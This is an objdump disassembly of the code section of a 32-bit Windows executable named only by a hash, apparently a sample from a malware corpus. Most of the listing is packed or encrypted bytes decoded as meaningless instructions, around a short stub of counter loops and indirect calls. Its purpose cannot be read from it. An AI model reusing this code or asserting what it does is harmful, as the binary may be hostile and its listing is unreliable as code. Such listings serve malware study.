
7aea7d9ec28c4c0eda08bbdeaf3a2fc07987387b6f1e0c17780c0154bb8996fa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	mov    WORD PTR [ecx+0x7e7e29ca],?
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	adc    al,0xc
  40102f:	(bad)  
  401031:	bswap  esp
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc0
  4010c7:	test   al,0xdf
  4010c9:	mov    al,BYTE PTR [esi+ebx*4+0x1df7f4d1]
  4010d0:	sub    dh,BYTE PTR [ecx+esi*4]
  4010d3:	fs xchg edi,eax
  4010d5:	and    eax,0xe17a67e1
  4010da:	cmc    
  4010db:	jle    0x401094
  4010dd:	mov    edi,0x874a0866
  4010e2:	lahf   
  4010e3:	out    0xe3,eax
  4010e5:	inc    edx
  4010e6:	mov    bl,0xe9
  4010e8:	mov    ds:0x91dd449,eax
  4010ed:	cwde   
  4010ee:	push   ebx
  4010ef:	push   ebx
  4010f0:	sub    BYTE PTR [ebp-0x23],0x63
  4010f4:	arpl   WORD PTR [esi+0x379d6196],sp
  4010fa:	jl     0x4010fe
  4010fc:	loopne 0x401085
  4010fe:	aam    0x36
  401100:	repz jmp 0x4010d2
  401103:	clc    
  401104:	in     al,0x5f
  401106:	(bad)  
  401107:	push   esp
  401108:	hlt    
  401109:	jge    0x401182
  40110b:	mov    cl,0x86
  40110d:	pop    eax
  40110e:	mov    ch,0x6a
  401110:	or     eax,0x5fea887d
  401115:	pop    es
  401116:	and    eax,0xbcea1c78
  40111b:	movups xmm3,xmm2
  40111e:	or     al,0x31
  401120:	clc    
  401121:	xchg   esi,eax
  401122:	les    edx,FWORD PTR ds:0x6dbf1bb4
  401128:	or     eax,0x3df141c6
  40112d:	fld    QWORD PTR [ebx]
  40112f:	sar    DWORD PTR ds:0xde302ed1,cl
  401135:	inc    ecx
  401136:	call   0x5eb3:0x9b3a52ee
  40113d:	or     al,0x88
  40113f:	sub    al,0xd7
  401141:	and    BYTE PTR [esi+ecx*8-0x69],bl
  401145:	leave  
  401146:	inc    esi
  401147:	out    0x3f,al
  401149:	mov    DWORD PTR [ebx+ebp*4-0x705ff39b],ebp
  401150:	jmp    0x401136
  401152:	pop    ebp
  401153:	mov    al,ds:0x578317cb
  401158:	dec    ebp
  401159:	jg     0x40118b
  40115b:	sbb    al,0x1a
  40115d:	in     eax,dx
  40115e:	dec    eax
  40115f:	arpl   WORD PTR ss:[edi],bp
  401162:	inc    ecx
  401163:	mov    al,0xe2
  401165:	cwde   
  401166:	fstp   DWORD PTR [edi]
  401168:	push   0xffffffee
  40116a:	pusha  
  40116b:	cmp    edi,DWORD PTR [edi-0x7a482cd2]
  401171:	jbe    0x4011bf
  401173:	call   0xc69e:0x5df17614
  40117a:	int    0x80
  40117c:	call   0x2f99:0x6042b076
  401183:	sti    
  401184:	dec    ebp
  401185:	xor    DWORD PTR [esi+0x8],0xffffffa6
  401189:	out    dx,eax
  40118a:	or     DWORD PTR [esi-0x34],ecx
  40118d:	in     al,dx
  40118e:	mov    ebp,0xa98c1379
  401193:	adc    BYTE PTR [ebp-0x3bb799e4],dh
  401199:	cs mov bl,0x2b
  40119c:	push   ecx
  40119d:	xor    BYTE PTR [edi-0x605c8033],ah
  4011a3:	sbb    eax,DWORD PTR [edi]
  4011a5:	not    BYTE PTR [edi+0x75]
  4011a8:	push   ecx
  4011a9:	test   eax,0xaef32041
  4011ae:	cli    
  4011af:	ja     0x401147
  4011b1:	fwait
  4011b2:	xor    ah,BYTE PTR [ebx-0x54]
  4011b5:	add    al,0xb5
  4011b8:	push   0xffffffa1
  4011ba:	out    dx,eax
  4011bb:	mov    ds:0x661d7e5d,eax
  4011c0:	dec    esp
  4011c1:	xor    eax,0xdbd0d4cb
  4011c6:	jp     0x40119c
  4011c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011c9:	pushf  
  4011ca:	jo     0x4011f6
  4011cc:	xor    eax,0x6a3098e
  4011d1:	test   ch,0xa8
  4011d4:	pop    ds
  4011d5:	loopne 0x401255
  4011d7:	xor    esi,DWORD PTR [eax+0x71545a74]
  4011dd:	int3   
  4011de:	(bad)  
  4011df:	push   ebp
  4011e0:	dec    esi
  4011e1:	psubusb mm1,QWORD PTR [ebp+0x28]
  4011e5:	int3   
  4011e6:	aaa    
  4011e7:	adc    ebp,DWORD PTR [esi+edx*8+0x4f6ea9fb]
  4011ee:	dec    ebp
  4011ef:	outs   dx,DWORD PTR ds:[esi]
  4011f0:	ficom  WORD PTR [ebp-0x2b092231]
  4011f6:	push   eax
  4011f7:	retf   
  4011f8:	idiv   DWORD PTR [edi-0x78]
  4011fb:	sar    dl,0x6
  4011fe:	pop    ebx
  4011ff:	retf   
  401200:	push   ss
  401201:	cmp    BYTE PTR [esi+0x522edc13],bh
  401207:	rcr    BYTE PTR [edx],cl
  401209:	iret   
  40120a:	xchg   ebp,eax
  40120b:	sub    DWORD PTR [edx+0x32],ebp
  40120e:	aas    
  40120f:	mov    al,0xdc
  401211:	popa   
  401212:	mov    ds:0xb6c23cec,eax
  401217:	pusha  
  401218:	sbb    eax,0x24d89b17
  40121d:	pop    ds
  40121e:	(bad)  
  40121f:	push   edx
  401220:	push   ss
  401221:	(bad)  
  401222:	mov    eax,0xbd609cd0
  401227:	mov    gs,WORD PTR [edx-0x661d5876]
  40122d:	fstp   TBYTE PTR [ebx]
  40122f:	sti    
  401230:	pop    esp
  401231:	add    edx,esi
  401233:	fidiv  DWORD PTR [ebx+0x7218b975]
  401239:	sub    eax,0x5b94e1
  40123e:	hlt    
  40123f:	daa    
  401240:	pop    ebx
  401241:	enter  0x5f8d,0x0
  401245:	arpl   ax,sp
  401247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401248:	xchg   esi,eax
  401249:	cdq    
  40124a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40124b:	fsubr  st(6),st
  40124d:	sub    eax,0x9f255521
  401252:	outs   dx,BYTE PTR ds:[esi]
  401253:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401255:	shl    dl,1
  401257:	xor    BYTE PTR [ebx-0x60974812],ah
  40125d:	sbb    ecx,DWORD PTR [ecx-0x734c6041]
  401263:	call   0x8a945c99
  401268:	or     ebx,DWORD PTR [ecx+esi*1]
  40126b:	out    dx,al
  40126c:	lods   al,BYTE PTR ds:[esi]
  40126d:	inc    edi
  40126e:	xchg   ecx,eax
  40126f:	arpl   WORD PTR [ecx+0x2a],bp
  401272:	adc    ch,BYTE PTR [edi+0x6bc859d0]
  401278:	jle    0x40122c
  40127a:	sbb    DWORD PTR [ecx+0xd],eax
  40127d:	fidiv  WORD PTR [ebx-0x4a]
  401280:	js     0x401220
  401282:	sub    DWORD PTR [ebp+0x34],esi
  401285:	gs clc 
  401287:	int3   
  401288:	ds (bad) 
  40128a:	jp     0x4012bc
  40128c:	out    0x4e,eax
  40128e:	xor    DWORD PTR [esi+0x7249bf13],eax
  401294:	les    ebp,FWORD PTR [ebp-0x6e]
  401297:	aas    
  401298:	push   ebx
  401299:	xchg   esp,esp
  40129b:	adc    eax,0xed9a1f3f
  4012a0:	repnz repnz cli 
  4012a3:	sbb    eax,0xa7a6e480
  4012a8:	imul   eax,DWORD PTR [ecx+0x20ef2580],0x2d82c66
  4012b2:	out    0xdf,al
  4012b4:	sbb    eax,0xa6a64ff2
  4012b9:	xchg   edx,eax
  4012ba:	imul   esi,DWORD PTR ds:[edx+0xa],0x54
  4012bf:	jecxz  0x4012f4
  4012c1:	xchg   esi,eax
  4012c2:	jl     0x401276
  4012c4:	or     BYTE PTR [edx],dh
  4012c6:	add    DWORD PTR [ebx-0x69],esp
  4012c9:	loopne 0x40132e
  4012cb:	shr    DWORD PTR [edi+0x2d],1
  4012ce:	cmp    eax,0x6e5e5949
  4012d3:	push   ds
  4012d4:	popf   
  4012d5:	(bad)  
  4012d6:	cmp    dh,BYTE PTR [ecx-0x54]
  4012d9:	pop    eax
  4012da:	iret   
  4012db:	cs xchg edi,eax
  4012dd:	mov    al,ds:0x13b35472
  4012e2:	inc    ebx
  4012e3:	lahf   
  4012e4:	cmp    BYTE PTR [ecx+0x691a9b86],0x98
  4012eb:	(bad)  
  4012ed:	data16 out 0xfe,al
  4012f0:	or     BYTE PTR [edx+ecx*1-0x333bc81d],0xfa
  4012f8:	inc    ecx
  4012f9:	les    ebx,FWORD PTR [eax+0xc]
  4012fc:	pop    esp
  4012fd:	call   0x9927:0xc3199610
  401304:	and    ecx,ecx
  401306:	jbe    0x4012dd
  401308:	imul   ebx,DWORD PTR gs:[ebx+0x24],0x8a3f01e4
  401310:	lods   al,BYTE PTR ds:[esi]
  401311:	stc    
  401312:	mov    ch,0xaf
  401314:	fmul   DWORD PTR [esi+0x7c8b35e4]
  40131a:	or     edx,DWORD PTR [ebx]
  40131c:	dec    ebp
  40131d:	xlat   BYTE PTR ds:[ebx]
  40131e:	sub    bl,BYTE PTR [ecx+0x721c4e73]
  401324:	scas   eax,DWORD PTR es:[edi]
  401325:	addr16 (bad) 
  401327:	jno    0x401337
  401329:	jmp    0x5935:0xd6b8c233
  401330:	in     eax,dx
  401331:	adc    BYTE PTR [eax+0x1c],0x36
  401335:	outs   dx,BYTE PTR ds:[esi]
  401336:	daa    
  401337:	in     al,0x7c
  401339:	je     0x40135d
  40133b:	pop    ebp
  40133c:	mov    esi,0x6f68d6fe
  401341:	mov    ds:0xaf02d211,al
  401347:	dec    ecx
  401348:	adc    cl,BYTE PTR [ebp+0x14a654e3]
  40134e:	jmp    0x51eca002
  401353:	aad    0xf5
  401355:	jnp    0x4012f0
  401357:	sbb    al,0x4
  401359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40135a:	bound  esp,QWORD PTR [esi+0x35]
  40135d:	outs   dx,DWORD PTR ds:[esi]
  40135e:	repz fsub DWORD PTR [ecx+ebx*1]
  401362:	xchg   ebp,eax
  401363:	and    dl,BYTE PTR [ebx]
  401365:	pop    es
  401366:	cmp    ecx,DWORD PTR [edx]
  401368:	int3   
  401369:	(bad)  
  40136a:	jge    0x4013eb
  40136c:	test   al,0xc2
  40136e:	imul   esi,DWORD PTR [edi+0x5cbfe657],0xffffffe6
  401375:	push   eax
  401376:	or     eax,esp
  401378:	inc    ebp
  401379:	jb     0x40134c
  40137b:	mov    esi,0xf76e7867
  401380:	call   0xb73e16cf
  401385:	xor    eax,0x14726a
  40138a:	fsub   DWORD PTR [edi-0x42]
  40138d:	(bad)  
  40138e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40138f:	dec    esi
  401390:	outs   dx,BYTE PTR ds:[esi]
  401391:	add    DWORD PTR [ebp+0x48dc05b9],edx
  401397:	jo     0x401369
  401399:	popf   
  40139a:	or     edx,ecx
  40139c:	add    dh,dh
  40139e:	out    0x4b,al
  4013a0:	add    DWORD PTR [ecx-0x76a6a0b1],edi
  4013a6:	daa    
  4013a7:	sub    eax,0xe59e859a
  4013ac:	lahf   
  4013ad:	pop    eax
  4013ae:	pusha  
  4013af:	cmp    al,0x56
  4013b1:	jb     0x4013fd
  4013b3:	push   ds
  4013b4:	sub    esp,0x2c
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430586,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ef20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ef20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ef20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eaec
  401403:	mov    ecx,DWORD PTR ds:0x42ef20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ef20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ef24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430656,0x15
  401428:	cmp    DWORD PTR ds:0x430656,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430656,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e8e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eaf0
  40145f:	cmp    DWORD PTR ds:0x430656,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430656
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430656,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430656
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430656,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43059a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x1850:0xc48b26e
  4014ab:	mov    esi,0x7182209e
  4014b0:	jle    0x401530
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	rol    BYTE PTR [eax-0x25],0xcb
  4014ba:	cmc    
  4014bb:	xor    dh,BYTE PTR [ebx]
  4014bd:	dec    esi
  4014be:	cmp    cl,BYTE PTR [eax-0x4cae9f99]
  4014c4:	add    eax,0xae3bbfaa
  4014c9:	and    al,0x3f
  4014cb:	out    dx,eax
  4014cc:	nop
  4014cd:	jg     0x4014bb
  4014cf:	out    dx,al
  4014d0:	push   ebp
  4014d1:	lahf   
  4014d2:	push   edx
  4014d3:	push   0xed054f91
  4014d8:	sbb    eax,0x833be0b7
  4014dd:	cmp    al,0x34
  4014df:	test   DWORD PTR [edi-0x77],ebx
  4014e2:	or     BYTE PTR [edx],dl
  4014e4:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4014e6:	adc    ch,al
  4014e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014e9:	mov    BYTE PTR [ebp-0x40],dh
  4014ec:	or     DWORD PTR [esi-0x1770a381],esi
  4014f2:	pop    eax
  4014f3:	arpl   WORD PTR [edx+eiz*8-0x50],dx
  4014f7:	popf   
  4014f8:	nop
  4014f9:	add    ch,dl
  4014fb:	icebp  
  4014fc:	add    ch,bl
  4014fe:	add    eax,0xfa9f761
  401503:	pop    ebp
  401504:	scas   al,BYTE PTR es:[edi]
  401505:	popf   
  401506:	jae    0x40156e
  401508:	and    edx,DWORD PTR [edi-0x18]
  40150b:	adc    al,0xac
  40150d:	or     edi,0x9fa2b958
  401513:	scas   eax,DWORD PTR es:[edi]
  401514:	shl    DWORD PTR [esi],1
  401516:	iret   
  401517:	or     ch,BYTE PTR [edx-0x61]
  40151a:	iret   
  40151b:	or     cl,BYTE PTR [esi+0x30fee491]
  401521:	das    
  401522:	xchg   DWORD PTR [ebx],eax
  401524:	ins    BYTE PTR es:[edi],dx
  401525:	push   es
  401526:	imul   ebx,DWORD PTR [ebx],0x34
  401529:	dec    ecx
  40152a:	jle    0x401549
  40152c:	add    edi,DWORD PTR [edx]
  40152e:	xor    dl,BYTE PTR [edx+0x4ca9683e]
  401534:	enter  0xf56a,0x19
  401538:	or     BYTE PTR [edx],dh
  40153a:	sbb    BYTE PTR [esi+0x31fe328],al
  401540:	add    BYTE PTR [eax],0x97
  401543:	push   edi
  401544:	push   ecx
  401545:	and    DWORD PTR ds:0xee45ccd5,edi
  40154b:	cdq    
  40154c:	call   0xd6d0244b
  401551:	mov    dh,0x68
  401553:	out    dx,al
  401554:	xchg   ebx,eax
  401555:	inc    edi
  401556:	test   BYTE PTR gs:[edx+0x33],al
  40155a:	imul   esi,eax,0x67
  40155d:	es das 
  40155f:	dec    ebp
  401560:	js     0x40159b
  401562:	leave  
  401563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401564:	loopne 0x4014f4
  401566:	inc    ebx
  401567:	add    ah,BYTE PTR [esi+0x1a]
  40156a:	shl    BYTE PTR [ecx+0x74],0xe7
  40156e:	or     al,0xb8
  401570:	push   edx
  401571:	mov    WORD PTR [ebp+0x36],?
  401574:	sub    esi,DWORD PTR [eax+0x4cb2a708]
  40157a:	jae    0x40151e
  40157c:	fistp  WORD PTR [edx+0xaacc0ff]
  401582:	inc    edx
  401583:	mov    cl,0x30
  401585:	fild   WORD PTR [edi+0x6d]
  401588:	aaa    
  401589:	das    
  40158a:	je     0x40158a
  40158c:	push   cs
  40158d:	mov    ebx,0x36c993ca
  401593:	inc    ecx
  401594:	(bad)  
  401595:	fild   WORD PTR [ebx+ecx*4-0x52]
  401599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40159a:	int    0xb4
  40159c:	pop    esi
  40159d:	xchg   edi,eax
  40159e:	mov    eax,0xa61473f4
  4015a3:	cwde   
  4015a4:	fwait
  4015a5:	inc    ebp
  4015a6:	loop   0x4015f6
  4015a8:	sar    DWORD PTR [ecx-0x25106d80],cl
  4015ae:	popf   
  4015af:	jge    0x40162b
  4015b1:	retf   0x3224
  4015b4:	mov    eax,ds:0x18cdc376
  4015b9:	jnp    0x401615
  4015bb:	jmp    0xf06c6410
  4015c0:	enter  0xec79,0x37
  4015c4:	out    0x85,eax
  4015c6:	and    eax,0xc9ca9186
  4015cb:	js     0x401636
  4015cd:	xchg   ebx,eax
  4015ce:	(bad)  
  4015cf:	test   eax,0xe127074e
  4015d4:	scas   eax,DWORD PTR es:[edi]
  4015d5:	jl     0x401606
  4015d7:	or     DWORD PTR [eax],eax
  4015d9:	pop    edx
  4015da:	enter  0x3a0e,0x5a
  4015de:	cmp    BYTE PTR [esi+0x52],ah
  4015e1:	jbe    0x40157a
  4015e3:	mov    ds:0xe57c4eed,eax
  4015e8:	dec    ebx
  4015e9:	push   ecx
  4015ea:	and    BYTE PTR [edx-0x300bb5e8],0xc1
  4015f1:	mov    ebp,0x59b1973c
  4015f6:	imul   ebp,DWORD PTR ds:0xd38ffbd2,0xfffffff3
  4015fd:	dec    esi
  4015fe:	push   edi
  4015ff:	jp     0x401657
  401601:	cmp    BYTE PTR [edi-0xdab0bec],ch
  401607:	jnp    0x401601
  401609:	cmp    esp,DWORD PTR [edx-0x6a079536]
  40160f:	dec    edx
  401610:	and    DWORD PTR [edi-0x7b88d48d],ebx
  401616:	dec    ebp
  401617:	pop    edi
  401618:	sub    ah,BYTE PTR [edx-0x5c16812c]
  40161e:	cwde   
  40161f:	or     edx,DWORD PTR [esi]
  401621:	cwde   
  401622:	pop    ss
  401623:	mov    al,ds:0x5614741a
  401628:	repz bound edx,QWORD PTR [edi+0x71b8de1e]
  40162f:	xchg   BYTE PTR [ecx+ecx*2],bl
  401632:	scas   al,BYTE PTR es:[edi]
  401633:	popa   
  401634:	push   es
  401635:	push   0xffffffd9
  401637:	xor    DWORD PTR [edi],ebx
  401639:	into   
  40163a:	push   ebp
  40163b:	fcomp  DWORD PTR ds:0xf9e94b74
  401641:	jmp    0x73a4:0x972d88f7
  401648:	push   cs
  401649:	pop    ss
  40164a:	icebp  
  40164b:	jne    0x4016c1
  40164d:	mov    dl,0x0
  40164f:	mov    edx,0x684d441
  401654:	add    BYTE PTR [ebp-0x5c0a653c],al
  40165a:	and    BYTE PTR [ebx],dh
  40165c:	adc    eax,0xb5530997
  401661:	push   0x7c2e2acb
  401666:	push   eax
  401667:	xchg   DWORD PTR [esi-0x3586144b],ebp
  40166d:	mov    WORD PTR [edx],ss
  40166f:	div    BYTE PTR [edi-0x2c28f57a]
  401675:	jne    0x401675
  401677:	dec    ebp
  401678:	dec    edi
  401679:	cwde   
  40167a:	mov    dl,0x25
  40167c:	jp     0x401615
  40167e:	data16 arpl WORD PTR [ecx+ebp*4-0x7a84c408],di
  401686:	out    0x4c,eax
  401688:	es cmp al,0x43
  40168b:	jnp    0x401664
  40168d:	adc    DWORD PTR [eax-0x1048ce7c],ecx
  401693:	lods   eax,DWORD PTR ds:[esi]
  401694:	mov    BYTE PTR [edx+0x47],al
  401697:	enter  0x8786,0xb4
  40169b:	mov    ds:0x6386d82c,eax
  4016a0:	xchg   esp,eax
  4016a1:	fwait
  4016a2:	inc    edi
  4016a3:	mov    dh,0x16
  4016a5:	mov    dl,0x25
  4016a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a8:	das    
  4016a9:	sub    ch,ch
  4016ab:	imul   esp,DWORD PTR [edi],0x2b17b287
  4016b1:	fadd   QWORD PTR [ecx-0x5]
  4016b4:	das    
  4016b5:	adc    ch,BYTE PTR [ebp+0x1807ab38]
  4016bb:	mov    ah,0xec
  4016bd:	sbb    esp,esp
  4016bf:	add    DWORD PTR [edx],0xc7148dd2
  4016c5:	sbb    bl,BYTE PTR [ebp+0x33]
  4016c8:	inc    esi
  4016c9:	(bad)  
  4016ca:	or     DWORD PTR [ebx+0x1b],eax
  4016cd:	sti    
  4016ce:	shr    DWORD PTR [edx+0x4b],1
  4016d1:	cld    
  4016d2:	mov    ch,0x23
  4016d4:	loope  0x40171e
  4016d6:	call   0x5dda1c6f
  4016db:	and    ebx,DWORD PTR [ecx]
  4016dd:	xor    eax,0xe5f6fd68
  4016e2:	pop    ecx
  4016e3:	rcr    DWORD PTR [eax-0x7f147293],1
  4016e9:	or     ch,cl
  4016eb:	dec    esi
  4016ec:	test   BYTE PTR ds:0xb0d3b450,0xdc
  4016f3:	test   eax,0x2f1e7d68
  4016f8:	mov    edi,0x220f1002
  4016fd:	mov    ah,0x91
  4016ff:	sti    
  401700:	sbb    ebp,edx
  401702:	push   ds
  401703:	std    
  401704:	cmp    BYTE PTR [esi-0x7458420a],ah
  40170a:	test   BYTE PTR [ebp+0x7d3c6cf0],dl
  401710:	sbb    al,0x46
  401712:	inc    edi
  401713:	cdq    
  401714:	mov    ebp,0xd26dd9f2
  401719:	pop    ecx
  40171a:	sub    BYTE PTR [edi+0x42c0b18e],dl
  401720:	mov    ds,WORD PTR [ebp-0x1]
  401723:	fcom   QWORD PTR [edx-0x80]
  401726:	inc    edx
  401727:	jno    0x40170d
  401729:	inc    esi
  40172a:	in     al,0xc8
  40172c:	pop    ecx
  40172d:	or     al,0x7d
  40172f:	sub    DWORD PTR [edi+0x1f],0x68014f19
  401736:	push   0xffffffed
  401738:	(bad)  
  401739:	daa    
  40173a:	add    eax,0xf6a0b96
  40173f:	push   ds
  401740:	dec    eax
  401741:	outs   dx,DWORD PTR ds:[esi]
  401742:	inc    edx
  401743:	data16 fistp DWORD PTR [esi]
  401746:	sbb    edi,DWORD PTR [eax-0x12]
  401749:	fild   WORD PTR [ebx-0x2d]
  40174c:	jne    0x401755
  40174e:	pop    esp
  40174f:	or     eax,ebx
  401751:	shl    ebx,cl
  401753:	(bad)
  401756:	out    0x59,eax
  401758:	xchg   esp,eax
  401759:	ret    0x5497
  40175c:	loope  0x4017c3
  40175e:	imul   edi,DWORD PTR [edx+0x7d645ab5],0x28
  401765:	out    dx,al
  401766:	inc    esp
  401767:	and    BYTE PTR [edi+ecx*4-0x12],0x72
  40176c:	mov    ebx,0xd64c04df
  401771:	adc    BYTE PTR [esi+0x2f],bh
  401774:	arpl   WORD PTR [esi+ecx*2],si
  401777:	fisub  WORD PTR [eax-0x55]
  40177a:	test   BYTE PTR [ecx],bl
  40177c:	dec    ecx
  40177d:	mov    esp,DWORD PTR [eax-0x60]
  401780:	add    eax,0xa81d26c3
  401785:	pop    ds
  401786:	push   0xba56f5ee
  40178b:	jmp    0x40180c
  40178d:	inc    esp
  40178e:	pop    edx
  40178f:	sbb    DWORD PTR ds:0xdc621cd8,esi
  401795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401797:	pop    ebp
  401798:	int3   
  401799:	jae    0x4017d4
  40179b:	xor    al,0xd
  40179d:	fst    st(3)
  40179f:	bound  edx,QWORD PTR [ecx+0x222e534]
  4017a5:	jp     0x40176c
  4017a7:	loope  0x4017e9
  4017a9:	push   es
  4017aa:	push   eax
  4017ab:	in     al,dx
  4017ac:	loope  0x40182c
  4017ae:	and    ebp,DWORD PTR [ebx-0x19]
  4017b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017b2:	call   0x5872:0x81a1bc50
  4017b9:	fdiv   st,st(7)
  4017bb:	xchg   esp,eax
  4017bc:	mov    ah,0x2a
  4017be:	sbb    BYTE PTR [ecx],dl
  4017c0:	jns    0x401769
  4017c2:	inc    edi
  4017c3:	inc    ebp
  4017c4:	xchg   DWORD PTR [ebp+0x4c],esp
  4017c7:	xor    al,0xac
  4017c9:	inc    esp
  4017ca:	sbb    al,0x67
  4017cc:	and    ecx,DWORD PTR [ecx+0x119a641e]
  4017d2:	js     0x401804
  4017d4:	into   
  4017d5:	cmp    al,0x86
  4017d7:	ror    DWORD PTR [ecx+0x1d],cl
  4017da:	mov    dh,0xcf
  4017dc:	push   ss
  4017dd:	adc    eax,0xcfb3a752
  4017e2:	les    edi,FWORD PTR [ecx]
  4017e4:	mov    esp,0x8f2f4d73
  4017e9:	stos   DWORD PTR es:[edi],eax
  4017ea:	add    ah,BYTE PTR [edi]
  4017ec:	pop    ebx
  4017ed:	lock cmp edi,DWORD PTR [ebx-0x66]
  4017f1:	ret    
  4017f2:	push   ecx
  4017f3:	ret    0x930a
  4017f6:	rcl    DWORD PTR [ebp+0xcb9e18a],cl
  4017fc:	pop    ebx
  4017fd:	cmp    eax,0x59d5359
  401802:	sbb    eax,0x90769023
  401807:	(bad)  
  401808:	ins    DWORD PTR es:[edi],dx
  401809:	imul   eax,DWORD PTR ds:0xa753d72,0xffffffd7
  401810:	addr16 dec edx
  401812:	xchg   ecx,eax
  401813:	push   edi
  401814:	mov    edi,0xfe0fbd90
  401819:	xchg   ecx,eax
  40181a:	rol    dh,1
  40181c:	hlt    
  40181d:	fs xchg edx,eax
  40181f:	cli    
  401820:	adc    BYTE PTR [edx],bh
  401822:	(bad)  
  401823:	ins    DWORD PTR es:[edi],dx
  401824:	cmc    
  401825:	gs or  al,0x18
  401828:	ds add eax,0x4dd171a8
  40182e:	xor    eax,0x6106a367
  401833:	xor    DWORD PTR [edx-0x1167514a],edi
  401839:	or     esp,0xfc3c1454
  40183f:	ins    BYTE PTR es:[edi],dx
  401840:	sbb    edi,edi
  401842:	outs   dx,BYTE PTR ds:[esi]
  401843:	int    0x3b
  401845:	bound  esi,QWORD PTR [eax]
  401847:	or     DWORD PTR [esi],ecx
  401849:	mov    DWORD PTR [di-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430596
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e862,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
